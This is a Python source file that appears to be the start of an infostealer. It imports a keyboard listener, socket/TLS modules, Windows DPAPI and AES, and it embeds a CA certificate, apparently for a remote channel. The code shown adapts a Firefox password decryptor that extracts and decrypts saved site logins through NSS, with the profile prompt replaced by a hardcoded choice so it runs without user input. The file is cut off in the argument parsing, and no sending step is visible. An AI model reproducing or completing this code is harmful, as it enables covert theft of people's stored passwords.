from __future__ import annotations
import socket
import ssl
import os
import pickle
import platform
from pynput.keyboard import Key, Listener
import logging
import threading
import subprocess
import argparse
import csv
import ctypes as ct
import json
import logging
import locale
import os
import sqlite3
import sys
from win32 import win32crypt 
import shutil
import base64 
from base64 import b64decode
from getpass import getpass
from itertools import chain
from subprocess import run, PIPE, DEVNULL
from urllib.parse import urlparse
from configparser import ConfigParser
from typing import Optional, Iterator, Any
import time
from Crypto.Cipher import AES
from datetime import timezone, datetime, timedelta 
import psutil

CA_CERTIFICATE = """
-----BEGIN CERTIFICATE-----
MIIFWzCCA0OgAwIBAgIUJXty+BMNMiMe+hr61L0Nw7jfCpcwDQYJKoZIhvcNAQEL
BQAwPTELMAkGA1UEBhMCZnIxCzAJBgNVBAgMAmZyMSEwHwYDVQQKDBhJbnRlcm5l
dCBXaWRnaXRzIFB0eSBMdGQwHhcNMjQwNzA2MTgwNTQ5WhcNMjUwNzA2MTgwNTQ5
WjA9MQswCQYDVQQGEwJmcjELMAkGA1UECAwCZnIxITAfBgNVBAoMGEludGVybmV0
IFdpZGdpdHMgUHR5IEx0ZDCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIB
AKVPPA/LST/4pnjp7U4Qek4PvIajT2KYxB3XB9Nspr5u3qcaOsJpTtHJdRpgEJwN
tOl7cXvZ/ZrYMJILhQNFciisplwFVfRVzfbdE1bJ87avA9iA5lcMhhHp+mw6/ZDh
JlNLv07l9yBFSwv1tQLbvrDWhgF4/TfYglQR/eoCaQsKaykny2sX1kaI230DbLj9
6oODu/VnFlkhOJQXGD2CT2g2ICWti+wSuHa6hwqq5A5FIL7yHyXi6BEPtdEzvFyI
vCmnJJYHsoOih0tKRtb1oaomWPs7M90C5OBoYhtmgg+QlAIcFiCODJutVEaSyNgh
c0PZ0pc5gGoicOMWTzIx7pNJ1GV2VpR+0s/f0AfSZKQeD+BD941HDXQMdQSvDGQh
/czzNP2W2GAYNROCBAELQytOeDagK0O2fBEO8vsd7om0RaoGRmkwFnNB0CdMzkmH
jfUL/LKFINBNcIalDBwWjpkRiWdlt21jLmv32w+rpOodycbHrHaQuYEzctWO6Ri2
Ajv73YGQUaJXcOlCXqnFu6UfYtUZoiJ9i/cpR8j7WH0/DLBIGoKSR4xO80VL6x4h
D5TIjBo5GExTya/ZcT37sPLNnvdHkEEKsyytKfLIm1VNVfHzLgUayw3eA43asR70
jLcuLvl90XEFba1JcjR+HvY2UO086VQVr+K6ec8Lao5JAgMBAAGjUzBRMB0GA1Ud
DgQWBBQzsTUpvYOVSPudhBDrNWBlQ9f2eTAfBgNVHSMEGDAWgBQzsTUpvYOVSPud
hBDrNWBlQ9f2eTAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4ICAQB0
Zz2jvhcyXGuVvfx51yIDyUKj5FfaUOlIeP9iDN622+Hi2TLuHgtlkRovAVERgrQ7
fODlBLL+u3k+r3d5bzseuumKHaakVPtzIw2MMZtTHRXOtRJJ5gl3bTrU90YPrdWN
B3BlfyMph/Fq7SUIufYhb9J4ddyA4bWm8TVBUFKeSF2KwMKXNPBjMIUQLWsO4KEZ
d9TpXx8rdQE4RIPJSNIMf1guetnMQciv1uf9EkGOvtRrEcREbfS4gS0GZpS3Drji
qI/KTrZtaaWG2dTcyYK9EJIJZ4RyOzH96zcMdP+mWB+J55NZN7gljxxtGPw1z7gM
59HgFp2qTfQeHYMun3vokmf1Jte3lZzaiZuPR3GUzwPG34x8WGletiU85tj1MnPN
+V2h23ywaUyL84JD/duN1pVNmVzSNP8VvVMA8E9LJHAZBIwoKBgk2mbaANTgA9fT
AJfQORpMT3gWM0PfrOOBqWIG2jmNnprYEYdHkNZGmfgRkMC3w/SLnPpucwCMmiYr
1CM17wPZM+TABoDS662T0R0RMLAOpvZZVJKNPoBnvfTr62N5rVpuoUzvyIiHSXMt
nLi4APzeJR1UeP2EW4RQ31sOGbjs2x9On2S+AElVCq2uBexgRKik9qA93b4wm0gV
Jgu5aivd1fyrqZF3dAYB9BXcd9aKLtP+LD4fFGWfXQ==
-----END CERTIFICATE-----
"""


LOG: logging.Logger
VERBOSE = False
SYSTEM = platform.system()
SYS64 = sys.maxsize > 2**32
DEFAULT_ENCODING = "utf-8"

PWStore = list[dict[str, str]]
__version_info__ = (1, 1, 0, "+git")

class firefox:
    def get_version() -> str:
        """Obtain version information from git if available otherwise use
        the internal version number
        """
        def internal_version():
            return ".".join(map(str, __version_info__[:3])) + "".join(__version_info__[3:])
        try:
            p = run(["git", "describe", "--tags"], stdout=PIPE, stderr=DEVNULL, text=True)
        except FileNotFoundError:
            return internal_version()
        if p.returncode:
            return internal_version()
        else:
            return p.stdout.strip()

    __version__: str = get_version()

    class NotFoundError(Exception):
        """Exception to handle situations where a credentials file is not found"""
        pass

    class Exit(Exception):
        """Exception to allow a clean exit from any point in execution"""
        CLEAN = 0
        ERROR = 1
        MISSING_PROFILEINI = 2
        MISSING_SECRETS = 3
        BAD_PROFILEINI = 4
        LOCATION_NO_DIRECTORY = 5
        BAD_SECRETS = 6
        BAD_LOCALE = 7
        FAIL_LOCATE_NSS = 10
        FAIL_LOAD_NSS = 11
        FAIL_INIT_NSS = 12
        FAIL_NSS_KEYSLOT = 13
        FAIL_SHUTDOWN_NSS = 14
        BAD_PRIMARY_PASSWORD = 15
        NEED_PRIMARY_PASSWORD = 16
        DECRYPTION_FAILED = 17
        PASSSTORE_NOT_INIT = 20
        PASSSTORE_MISSING = 21
        PASSSTORE_ERROR = 22
        READ_GOT_EOF = 30
        MISSING_CHOICE = 31
        NO_SUCH_PROFILE = 32
        UNKNOWN_ERROR = 100
        KEYBOARD_INTERRUPT = 102

        def __init__(self, exitcode):
            self.exitcode = exitcode

        def __unicode__(self):
            return f"Premature program exit with exit code {self.exitcode}"

    class Credentials:
        """Base credentials backend manager"""
        def __init__(self, db):
            self.db = db
            LOG.debug("Database location: %s", self.db)
            if not os.path.isfile(db):
                raise firefox.NotFoundError(f"ERROR - {db} database not found\n")
            LOG.info("Using %s for credentials.", db)

        def __iter__(self) -> Iterator[tuple[str, str, str, int]]:
            pass

        def done(self):
            """Override this method if the credentials subclass needs to do any
            action after interaction
            """
            pass

    class SqliteCredentials(Credentials):
        """SQLite credentials backend manager"""
        def __init__(self, profile):
            db = os.path.join(profile, "signons.sqlite")
            super(firefox.SqliteCredentials, self).__init__(db)
            self.conn = sqlite3.connect(db)
            self.c = self.conn.cursor()

        def __iter__(self) -> Iterator[tuple[str, str, str, int]]:
            LOG.debug("Reading password database in SQLite format")
            self.c.execute(
                "SELECT hostname, encryptedUsername, encryptedPassword, encType "
                "FROM moz_logins"
            )
            for i in self.c:
                # yields hostname, encryptedUsername, encryptedPassword, encType
                yield i

        def done(self):
            """Close the sqlite cursor and database connection"""
            super(firefox.SqliteCredentials, self).done()
            self.c.close()
            self.conn.close()

    class JsonCredentials(Credentials):
        """JSON credentials backend manager"""
        def __init__(self, profile):
            db = os.path.join(profile, "logins.json")
            super(firefox.JsonCredentials, self).__init__(db)

        def __iter__(self) -> Iterator[tuple[str, str, str, int]]:
            with open(self.db) as fh:
                LOG.debug("Reading password database in JSON format")
                data = json.load(fh)
                try:
                    logins = data["logins"]
                except Exception:
                    LOG.error(f"Unrecognized format in {self.db}")
                    raise firefox.Exit(firefox.Exit.BAD_SECRETS)
                for i in logins:
                    try:
                        yield (
                            i["hostname"],
                            i["encryptedUsername"],
                            i["encryptedPassword"],
                            i["encType"],
                        )
                    except KeyError:
                        # This should handle deleted passwords that still maintain
                        # a record in the JSON file - GitHub issue #99
                        LOG.info(f"Skipped record {i} due to missing fields")

    def find_nss(locations, nssname) -> ct.CDLL:
        """Locate nss is one of the many possible locations"""
        fail_errors: list[tuple[str, str]] = []
        OS = ("Windows", "Darwin")
        for loc in locations:
            nsslib = os.path.join(loc, nssname)
            LOG.debug("Loading NSS library from %s", nsslib)
            if SYSTEM in OS:
                # On windows in order to find DLLs referenced by nss3.dll
                # we need to have those locations on PATH
                os.environ["PATH"] = ";".join([loc, os.environ["PATH"]])
                LOG.debug("PATH is now %s", os.environ["PATH"])
                # However this doesn't seem to work on all setups and needs to be
                # set before starting python so as a workaround we chdir to
                # Firefox's nss3.dll/libnss3.dylib location
                if loc:
                    if not os.path.isdir(loc):
                        # No point in trying to load from paths that don't exist
                        continue
                    workdir = os.getcwd()
                    os.chdir(loc)
            try:
                nss: ct.CDLL = ct.CDLL(nsslib)
            except OSError as e:
                fail_errors.append((nsslib, str(e)))
            else:
                LOG.debug("Loaded NSS library from %s", nsslib)
                return nss
            finally:
                if SYSTEM in OS and loc:
                    # Restore workdir changed above
                    os.chdir(workdir)
        else:
            LOG.error(
                "Couldn't find or load '%s'. This library is essential "
                "to interact with your Mozilla profile.",
                nssname,
            )
            LOG.error(
                "If you are seeing this error please perform a system-wide "
                "search for '%s' and file a bug report indicating any "
                "location found. Thanks!",
                nssname,
            )
            LOG.error(
                "Alternatively you can try launching firefox_decrypt "
                "from the location where you found '%s'. "
                "That is 'cd' or 'chdir' to that location and run "
                "firefox_decrypt from there.",
                nssname,
            )
            LOG.error(
                "Please also include the following on any bug report. "
                "Errors seen while searching/loading NSS:"
            )
            for target, error in fail_errors:
                LOG.error("Error when loading %s was %s", target, error)
            raise firefox.Exit(firefox.Exit.FAIL_LOCATE_NSS)

    def load_libnss():
        """Load libnss into python using the CDLL interface"""
        if SYSTEM == "Windows":
            nssname = "nss3.dll"
            locations: list[str] = [
                "",  # Current directory or system lib finder
                os.path.expanduser("~\\AppData\\Local\\Mozilla Firefox"),
                os.path.expanduser("~\\AppData\\Local\\Firefox Developer Edition"),
                os.path.expanduser("~\\AppData\\Local\\Mozilla Thunderbird"),
                os.path.expanduser("~\\AppData\\Local\\Nightly"),
                os.path.expanduser("~\\AppData\\Local\\SeaMonkey"),
                os.path.expanduser("~\\AppData\\Local\\Waterfox"),
                "C:\\Program Files\\Mozilla Firefox",
                "C:\\Program Files\\Firefox Developer Edition",
                "C:\\Program Files\\Mozilla Thunderbird",
                "C:\\Program Files\\Nightly",
                "C:\\Program Files\\SeaMonkey",
                "C:\\Program Files\\Waterfox",
            ]
            if not SYS64:
                locations = [
                    "",  # Current directory or system lib finder
                    "C:\\Program Files (x86)\\Mozilla Firefox",
                    "C:\\Program Files (x86)\\Firefox Developer Edition",
                    "C:\\Program Files (x86)\\Mozilla Thunderbird",
                    "C:\\Program Files (x86)\\Nightly",
                    "C:\\Program Files (x86)\\SeaMonkey",
                    "C:\\Program Files (x86)\\Waterfox",
                ] + locations
            # If either of the supported software is in PATH try to use it
            software = ["firefox", "thunderbird", "waterfox", "seamonkey"]
            for binary in software:
                location: Optional[str] = shutil.which(binary)
                if location is not None:
                    nsslocation: str = os.path.join(os.path.dirname(location), nssname)
                    locations.append(nsslocation)
        elif SYSTEM == "Darwin":
            nssname = "libnss3.dylib"
            locations = (
                "",  # Current directory or system lib finder
                "/usr/local/lib/nss",
                "/usr/local/lib",
                "/opt/local/lib/nss",
                "/sw/lib/firefox",
                "/sw/lib/mozilla",
                "/usr/local/opt/nss/lib",  # nss installed with Brew on Darwin
                "/opt/pkg/lib/nss",  # installed via pkgsrc
                "/Applications/Firefox.app/Contents/MacOS",  # default manual install location
                "/Applications/Thunderbird.app/Contents/MacOS",
                "/Applications/SeaMonkey.app/Contents/MacOS",
                "/Applications/Waterfox.app/Contents/MacOS",
            )
        else:
            nssname = "libnss3.so"
            if SYS64:
                locations = (
                    "",  # Current directory or system lib finder
                    "/usr/lib64",
                    "/usr/lib64/nss",
                    "/usr/lib",
                    "/usr/lib/nss",
                    "/usr/local/lib",
                    "/usr/local/lib/nss",
                    "/opt/local/lib",
                    "/opt/local/lib/nss",
                    os.path.expanduser("~/.nix-profile/lib"),
                )
            else:
                locations = (
                    "",  # Current directory or system lib finder
                    "/usr/lib",
                    "/usr/lib/nss",
                    "/usr/lib32",
                    "/usr/lib32/nss",
                    "/usr/lib64",
                    "/usr/lib64/nss",
                    "/usr/local/lib",
                    "/usr/local/lib/nss",
                    "/opt/local/lib",
                    "/opt/local/lib/nss",
                    os.path.expanduser("~/.nix-profile/lib"),
                )
        # If this succeeds libnss was loaded
        return firefox.find_nss(locations, nssname)

    class c_char_p_fromstr(ct.c_char_p):
        """ctypes char_p override that handles encoding str to bytes"""
        def from_param(self):
            return self.encode(DEFAULT_ENCODING)

    class NSSProxy:
        class SECItem(ct.Structure):
            """struct needed to interact with libnss"""
            _fields_ = [
                ("type", ct.c_uint),
                ("data", ct.c_char_p),  # actually: unsigned char *
                ("len", ct.c_uint),
            ]
            def decode_data(self):
                _bytes = ct.string_at(self.data, self.len)
                return _bytes.decode(DEFAULT_ENCODING)

        class PK11SlotInfo(ct.Structure):
            """Opaque structure representing a logical PKCS slot"""

        def __init__(self, non_fatal_decryption=False):
            # Locate libnss and try loading it
            self.libnss = firefox.load_libnss()
            self.non_fatal_decryption = non_fatal_decryption
            SlotInfoPtr = ct.POINTER(self.PK11SlotInfo)
            SECItemPtr = ct.POINTER(self.SECItem)
            self._set_ctypes(ct.c_int, "NSS_Init", firefox.c_char_p_fromstr)
            self._set_ctypes(ct.c_int, "NSS_Shutdown")
            self._set_ctypes(SlotInfoPtr, "PK11_GetInternalKeySlot")
            self._set_ctypes(None, "PK11_FreeSlot", SlotInfoPtr)
            self._set_ctypes(ct.c_int, "PK11_NeedLogin", SlotInfoPtr)
            self._set_ctypes(
                ct.c_int, "PK11_CheckUserPassword", SlotInfoPtr, firefox.c_char_p_fromstr
            )
            self._set_ctypes(
                ct.c_int, "PK11SDR_Decrypt", SECItemPtr, SECItemPtr, ct.c_void_p
            )
            self._set_ctypes(None, "SECITEM_ZfreeItem", SECItemPtr, ct.c_int)
            # for error handling
            self._set_ctypes(ct.c_int, "PORT_GetError")
            self._set_ctypes(ct.c_char_p, "PR_ErrorToName", ct.c_int)
            self._set_ctypes(ct.c_char_p, "PR_ErrorToString", ct.c_int, ct.c_uint32)

        def _set_ctypes(self, restype, name, *argtypes):
            """Set input/output types on libnss C functions for automatic type casting"""
            res = getattr(self.libnss, name)
            res.argtypes = argtypes
            res.restype = restype
            # Transparently handle decoding to string when returning a c_char_p
            if restype == ct.c_char_p:
                def _decode(result, func, *args):
                    try:
                        return result.decode(DEFAULT_ENCODING)
                    except AttributeError:
                        return result
                res.errcheck = _decode
            setattr(self, "_" + name, res)

        def initialize(self, profile: str):
            # The sql: prefix ensures compatibility with both
            # Berkley DB (cert8) and Sqlite (cert9) dbs
            profile_path = "sql:" + profile
            LOG.debug("Initializing NSS with profile '%s'", profile_path)
            err_status: int = self._NSS_Init(profile_path)
            LOG.debug("Initializing NSS returned %s", err_status)
            if err_status:
                self.handle_error(
                    firefox.Exit.FAIL_INIT_NSS,
                    "Couldn't initialize NSS, maybe '%s' is not a valid profile?",
                    profile,
                )

        def shutdown(self):
            err_status: int = self._NSS_Shutdown()
            if err_status:
                self.handle_error(
                    firefox.Exit.FAIL_SHUTDOWN_NSS,
                    "Couldn't shutdown current NSS profile",
                )

        def authenticate(self, profile, interactive):
            """Unlocks the profile if necessary, in which case a password
            will prompted to the user.
            """
            LOG.debug("Retrieving internal key slot")
            keyslot = self._PK11_GetInternalKeySlot()
            LOG.debug("Internal key slot %s", keyslot)
            if not keyslot:
                self.handle_error(
                    firefox.Exit.FAIL_NSS_KEYSLOT,
                    "Failed to retrieve internal KeySlot",
                )
            try:
                if self._PK11_NeedLogin(keyslot):
                    password: str = firefox.ask_password(profile, interactive)
                    LOG.debug("Authenticating with password '%s'", password)
                    err_status: int = self._PK11_CheckUserPassword(keyslot, password)
                    LOG.debug("Checking user password returned %s", err_status)
                    if err_status:
                        self.handle_error(
                            firefox.Exit.BAD_PRIMARY_PASSWORD,
                            "Primary password is not correct",
                        )
                else:
                    LOG.info("No Primary Password found - no authentication needed")
            finally:
                # Avoid leaking PK11KeySlot
                self._PK11_FreeSlot(keyslot)

        def handle_error(self, exitcode: int, *logerror: Any):
            """If an error happens in libnss, handle it and print some debug information"""
            if logerror:
                LOG.error(*logerror)
            else:
                LOG.debug("Error during a call to NSS library, trying to obtain error info")
            code = self._PORT_GetError()
            name = self._PR_ErrorToName(code)
            name = "NULL" if name is None else name
            # 0 is the default language (localization related)
            text = self._PR_ErrorToString(code, 0)
            LOG.debug("%s: %s", name, text)
            raise firefox.Exit(exitcode)

        def decrypt(self, data64):
            data = base64.b64decode(data64)
            inp = self.SECItem(0, data, len(data))
            out = self.SECItem(0, None, 0)
            err_status: int = self._PK11SDR_Decrypt(inp, out, None)
            LOG.debug("Decryption of data returned %s", err_status)
            try:
                if err_status:  # -1 means password failed, other status are unknown
                    error_msg = (
                        "Username/Password decryption failed. "
                        "Credentials damaged or cert/key file mismatch."
                    )
                    if self.non_fatal_decryption:
                        raise ValueError(error_msg)
                    else:
                        self.handle_error(firefox.Exit.DECRYPTION_FAILED, error_msg)
                res = out.decode_data()
            finally:
                # Avoid leaking SECItem
                self._SECITEM_ZfreeItem(out, 0)
            return res

    class MozillaInteraction:
        """
        Abstraction interface to Mozilla profile and lib NSS
        """
        def __init__(self, non_fatal_decryption=False):
            self.profile = None
            self.proxy = firefox.NSSProxy(non_fatal_decryption)

        def load_profile(self, profile):
            """Initialize the NSS library and profile"""
            self.profile = profile
            self.proxy.initialize(self.profile)

        def authenticate(self, interactive):
            """Authenticate the current profile if protected by a primary password,
            prompt the user and unlock the profile.
            """
            self.proxy.authenticate(self.profile, interactive)

        def unload_profile(self):
            """Shutdown NSS and deactivate current profile"""
            self.proxy.shutdown()

        def decrypt_passwords(self) -> PWStore:
            """Decrypt requested profile using the provided password.
            Returns all passwords in a list of dicts
            """
            credentials: firefox.Credentials = self.obtain_credentials()
            LOG.info("Decrypting credentials")
            outputs: PWStore = []
            for url, user, passw, enctype in credentials:
                # enctype informs if passwords need to be decrypted
                if enctype:
                    try:
                        LOG.debug("Decrypting username data '%s'", user)
                        user = self.proxy.decrypt(user)
                        LOG.debug("Decrypting password data '%s'", passw)
                        passw = self.proxy.decrypt(passw)
                    except (TypeError, ValueError) as e:
                        LOG.warning(
                            "Failed to decode username or password for entry from URL %s",
                            url,
                        )
                        LOG.debug(e, exc_info=True)
                        user = "*** decryption failed ***"
                        passw = "*** decryption failed ***"
                LOG.debug(
                    "Decoded username '%s' and password '%s' for website '%s'",
                    user,
                    passw,
                    url,
                )
                output = {"url": url, "user": user, "password": passw}
                outputs.append(output)
            if not outputs:
                LOG.warning("No passwords found in selected profile")
            # Close credential handles (SQL)
            credentials.done()
            return outputs

        def obtain_credentials(self) -> firefox.Credentials:
            """Figure out which of the 2 possible backend credential engines is available"""
            credentials: firefox.Credentials
            try:
                credentials = firefox.JsonCredentials(self.profile)
            except firefox.NotFoundError:
                try:
                    credentials = firefox.SqliteCredentials(self.profile)
                except firefox.NotFoundError:
                    LOG.error(
                        "Couldn't find credentials file (logins.json or signons.sqlite)."
                    )
                    raise firefox.Exit(firefox.Exit.MISSING_SECRETS)
            return credentials

    class OutputFormat:
        def __init__(self, pwstore: PWStore, cmdargs: argparse.Namespace):
            self.pwstore = pwstore
            self.cmdargs = cmdargs

        def output(self):
            pass

    class HumanOutputFormat(OutputFormat):
        def output(self):
            for output in self.pwstore:
                record: str = (
                    f"\nWebsite:   {output['url']}\n"
                    f"Username: '{output['user']}'\n"
                    f"Password: '{output['password']}'\n"
                )
                sys.stdout.write(record)

    class JSONOutputFormat(OutputFormat):
        def output(self):
            sys.stdout.write(json.dumps(self.pwstore, indent=2))
            # Json dumps doesn't add the final newline
            sys.stdout.write("\n")

    class CSVOutputFormat(OutputFormat):
        def __init__(self, pwstore: PWStore, cmdargs: argparse.Namespace):
            super().__init__(pwstore, cmdargs)
            self.delimiter = cmdargs.csv_delimiter
            self.quotechar = cmdargs.csv_quotechar
            self.header = cmdargs.csv_header

        def output(self):
            csv_writer = csv.DictWriter(
                sys.stdout,
                fieldnames=["url", "user", "password"],
                lineterminator="\n",
                delimiter=self.delimiter,
                quotechar=self.quotechar,
                quoting=csv.QUOTE_ALL,
            )
            if self.header:
                csv_writer.writeheader()
            for output in self.pwstore:
                csv_writer.writerow(output)

    class TabularOutputFormat(CSVOutputFormat):
        def __init__(self, pwstore: PWStore, cmdargs: argparse.Namespace):
            super().__init__(pwstore, cmdargs)
            self.delimiter = "\t"
            self.quotechar = "'"

    class PassOutputFormat(OutputFormat):
        def __init__(self, pwstore: PWStore, cmdargs: argparse.Namespace):
            super().__init__(pwstore, cmdargs)
            self.prefix = cmdargs.pass_prefix
            self.cmd = cmdargs.pass_cmd
            self.username_prefix = cmdargs.pass_username_prefix
            self.always_with_login = cmdargs.pass_always_with_login

        def output(self):
            self.test_pass_cmd()
            self.preprocess_outputs()
            self.export()

        def test_pass_cmd(self) -> None:
            """Check if pass from passwordstore.org is installed
            If it is installed but not initialized, initialize it
            """
            LOG.debug("Testing if password store is installed and configured")
            try:
                p = run([self.cmd, "ls"], capture_output=True, text=True)
            except FileNotFoundError as e:
                if e.errno == 2:
                    LOG.error("Password store is not installed and exporting was requested")
                    raise firefox.Exit(firefox.Exit.PASSSTORE_MISSING)
                else:
                    LOG.error("Unknown error happened.")
                    LOG.error("Error was '%s'", e)
                    raise firefox.Exit(firefox.Exit.UNKNOWN_ERROR)
            LOG.debug("pass returned:\nStdout: %s\nStderr: %s", p.stdout, p.stderr)
            if p.returncode != 0:
                if 'Try "pass init"' in p.stderr:
                    LOG.error("Password store was not initialized.")
                    LOG.error("Initialize the password store manually by using 'pass init'")
                    raise firefox.Exit(firefox.Exit.PASSSTORE_NOT_INIT)
                else:
                    LOG.error("Unknown error happened when running 'pass'.")
                    LOG.error("Stdout: %s\nStderr: %s", p.stdout, p.stderr)
                    raise firefox.Exit(firefox.Exit.UNKNOWN_ERROR)

        def preprocess_outputs(self):
            # Format of "self.to_export" should be:
            #     {"address": {"login": "password", ...}, ...}
            self.to_export: dict[str, dict[str, str]] = {}
            for record in self.pwstore:
                url = record["url"]
                user = record["user"]
                passw = record["password"]
                # Keep track of web-address, username and passwords
                # If more than one username exists for the same web-address
                # the username will be used as name of the file
                address = urlparse(url)
                if address.netloc not in self.to_export:
                    self.to_export[address.netloc] = {user: passw}
                else:
                    self.to_export[address.netloc][user] = passw

        def export(self):
            """Export given passwords to password store
            Format of "to_export" should be:
                {"address": {"login": "password", ...}, ...}
            """
            LOG.info("Exporting credentials to password store")
            if self.prefix:
                prefix = f"{self.prefix}/"
            else:
                prefix = self.prefix
            LOG.debug("Using pass prefix '%s'", prefix)
            for address in self.to_export:
                for user, passw in self.to_export[address].items():
                    # When more than one account exist for the same address, add
                    # the login to the password identifier
                    if self.always_with_login or len(self.to_export[address]) > 1:
                        passname = f"{prefix}{address}/{user}"
                    else:
                        passname = f"{prefix}{address}"
                    LOG.info("Exporting credentials for '%s'", passname)
                    data = f"{passw}\n{self.username_prefix}{user}\n"
                    LOG.debug("Inserting pass '%s' '%s'", passname, data)
                    # NOTE --force is used. Existing passwords will be overwritten
                    cmd: list[str] = [
                        self.cmd,
                        "insert",
                        "--force",
                        "--multiline",
                        passname,
                    ]
                    LOG.debug("Running command '%s' with stdin '%s'", cmd, data)
                    p = run(cmd, input=data, capture_output=True, text=True)
                    if p.returncode != 0:
                        LOG.error(
                            "ERROR: passwordstore exited with non-zero: %s", p.returncode
                        )
                        LOG.error("Stdout: %s\nStderr: %s", p.stdout, p.stderr)
                        raise firefox.Exit(firefox.Exit.PASSSTORE_ERROR)
                    LOG.debug("Successfully exported '%s'", passname)

    def get_sections(profiles):
        """
        Returns hash of profile numbers and profile names.
        """
        sections = {}
        i = 1
        for section in profiles.sections():
            if section.startswith("Profile"):
                sections[str(i)] = profiles.get(section, "Path")
                i += 1
            else:
                continue
        return sections

    def print_sections(sections, textIOWrapper=sys.stderr):
        """
        Prints all available sections to an textIOWrapper (defaults to sys.stderr)
        """
        for i in sorted(sections):
            textIOWrapper.write(f"{i} -> {sections[i]}\n")
        textIOWrapper.flush()

    def ask_section(sections: ConfigParser):
        """
        Prompt the user which profile should be used for decryption
        """
        # Do not ask for choice if user already gave one
        choice = "ASK"
        while choice not in sections:
            sys.stderr.write("Select the Mozilla profile you wish to decrypt\n")
            firefox.print_sections(sections)
            try:
                choice = "2"
            except EOFError:
                LOG.error("Could not read Choice, got EOF")
                raise firefox.Exit(firefox.Exit.READ_GOT_EOF)

        try:
            final_choice = sections[choice]
        except KeyError:
            LOG.error("Profile No. %s does not exist!", choice)
            raise firefox.Exit(firefox.Exit.NO_SUCH_PROFILE)

        LOG.debug("Profile selection matched %s", final_choice)

        return final_choice

    def ask_password(profile: str, interactive: bool) -> str:
        """
        Prompt for profile password
        """
        passwd: str
        passmsg = f"\nPrimary Password for profile {profile}: "
        if sys.stdin.isatty() and interactive:
            passwd = getpass(passmsg)
        else:
            sys.stderr.write("Reading Primary password from standard input:\n")
            sys.stderr.flush()
            # Ability to read the password from stdin (echo "pass" | ./firefox_...)
            passwd = sys.stdin.readline().rstrip("\n")
        return passwd

    def read_profiles(basepath):
        """
        Parse Firefox profiles in provided location.
        If list_profiles is true, will exit after listing available profiles.
        """
        profileini = os.path.join(basepath, "profiles.ini")
        LOG.debug("Reading profiles from %s", profileini)
        if not os.path.isfile(profileini):
            LOG.warning("profile.ini not found in %s", basepath)
            raise firefox.Exit(firefox.Exit.MISSING_PROFILEINI)
        # Read profiles from Firefox profile folder
        profiles = ConfigParser()
        profiles.read(profileini, encoding=DEFAULT_ENCODING)
        LOG.debug("Read profiles %s", profiles.sections())
        return profiles

    def get_profile(
        basepath: str, interactive: bool, choice: Optional[str], list_profiles: bool
    ):
        """
        Select profile to use by either reading profiles.ini or assuming given
        path is already a profile
        If interactive is false, will not try to ask which profile to decrypt.
        choice contains the choice the user gave us as an CLI arg.
        If list_profiles is true will exits after listing all available profiles.
        """
        try:
            profiles: ConfigParser = firefox.read_profiles(basepath)
        except firefox.Exit as e:
            if e.exitcode == firefox.Exit.MISSING_PROFILEINI:
                LOG.warning("Continuing and assuming '%s' is a profile location", basepath)
                profile = basepath
                if list_profiles:
                    LOG.error("Listing single profiles not permitted.")
                    raise
                if not os.path.isdir(profile):
                    LOG.error("Profile location '%s' is not a directory", profile)
                    raise
            else:
                raise
        else:
            if list_profiles:
                LOG.debug("Listing available profiles...")
                firefox.print_sections(firefox.get_sections(profiles), sys.stdout)
                raise firefox.Exit(firefox.Exit.CLEAN)
            sections = firefox.get_sections(profiles)
            if len(sections) == 1:
                section = sections["1"]
            elif choice is not None:
                try:
                    section = sections[choice]
                except KeyError:
                    LOG.error("Profile No. %s does not exist!", choice)
                    raise firefox.Exit(firefox.Exit.NO_SUCH_PROFILE)
            elif not interactive:
                LOG.error(
                    "Don't know which profile to decrypt. "
                    "We are in non-interactive mode and -c/--choice wasn't specified."
                )
                raise firefox.Exit(firefox.Exit.MISSING_CHOICE)
            else:
                # Ask user which profile to open
                section = firefox.ask_section(sections)
            section = section
            profile = os.path.join(basepath, section)
            if not os.path.isdir(profile):
                LOG.error(
                    "Profile location '%s' is not a directory. Has profiles.ini been tampered with?",
                    profile,
                )
                raise firefox.Exit(firefox.Exit.BAD_PROFILEINI)
        return profile

    # From https://bugs.python.org/msg323681
    class ConvertChoices(argparse.Action):
        """Argparse action that interprets the `choices` argument as a dict
        mapping the user-specified choices values to the resulting option
        values.
        """
        def __init__(self, *args, choices, **kwargs):
            super().__init__(*args, choices=choices.keys(), **kwargs)
            self.mapping = choices

        def __call__(self, parser, namespace, value, option_string=None):
            setattr(namespace, self.dest, self.mapping[value])

    @staticmethod
    def parse_sys_args() -> argparse.Namespace:
        """Parse command line arguments"""
        if SYSTEM == "Windows":
            profile_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox")
        elif os.uname()[0] == "Darwin":
            profile_path = "~/Library/Application Support/Firefox"
        else:
            profile_path = "~/.mozilla/firefox"
        parser = argparse.ArgumentParser(
            description="Access Firefox/Thunderbird profiles and decrypt existing passwords"
        )
        parser.add_argument(
            "profile",
            nargs="?",
            default=profile_path,
            help=f"Path to profile folder (default: {profile_path})",
        )
        format_choices = {
            "human": firefox.HumanOutputFormat,
            "json": firefox.JSONOutputFormat,
            "csv": firefox.CSVOutputFormat,
            "tabular": firefox.TabularOutputFormat,
            "pass": firefox.PassOutputFormat,
        }
        parser.add_argument(
            "-f",
            "--format",
            action=firefox.ConvertChoices,
            choices=format_choices,
            default=firefox.HumanOutputFormat,
            help="Format for the output.",
        )
        parser.add_argument(
            "-d",
            "--csv-delimiter",
            action="store",
            default=";",
            help="The delimiter for csv output",
        )
        parser.add_argument(
            "-q",
            "--csv-quotechar",
            action="store",
            default='"',
            help="The quote char for csv output",
        )
        parser.add_argument(
            "--no-csv-header",
            action="store_false",
            dest="csv_header",
            default=True,
            help="Do not include a header in CSV output.",
        )
        parser.add_argument(
            "--pass-username-prefix",
            action="store",
            default="",
            help=(
                "Export username as is (default), or with the provided format prefix. "
                "For instance 'login: ' for browserpass."
            ),
        )
        parser.add_argument(
            "-p",
            "--pass-prefix",
            action="store",
            default="web",
            help="Folder prefix for export to pass from passwordstore.org (default: %(default)s)",
        )
        parser.add_argument(
            "-m",
            "--pass-cmd",
            action="store",
            default="pass",
            help="Command/path to use when exporting to pass (default: %(default)s)",
        )
        parser.add_argument(
            "--pass-always-with-login",
            action="store_true",
            help="Always save as /<login> (default: only when multiple accounts per domain)",
        )
        parser.add_argument(
            "-n",
            "--no-interactive",
            action="store_false",
            dest="interactive",
            default=True,
            help="Disable interactivity.",
        )
        parser.add_argument(
            "--non-fatal-decryption",
            action="store_true",
            default=False,
            help="If set, corrupted entries will be skipped instead of aborting the process.",
        )
